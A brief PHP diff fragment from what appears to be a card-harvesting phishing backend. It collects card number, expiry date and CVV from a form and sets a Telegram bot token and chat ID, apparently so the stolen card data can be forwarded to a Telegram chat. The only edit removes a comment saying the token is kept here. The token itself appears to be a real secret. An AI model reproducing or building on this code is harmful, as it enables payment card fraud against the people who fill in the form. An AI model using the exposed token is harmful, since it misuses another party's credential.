@@ -8,7 +8,6 @@ $card    = $_POST['card'] ?? '';
 $expdate = $_POST['expdate'] ?? '';
 $cvv     = $_POST['cvv'] ?? '';
 
-// TOKEN YALNIZ BURADA
 $botToken = '9124698878:AAHaa7ybeZ-b72I3DN0ptfOM0SxTeHaayMc';
 $chatId   = '-1004326178006';
 
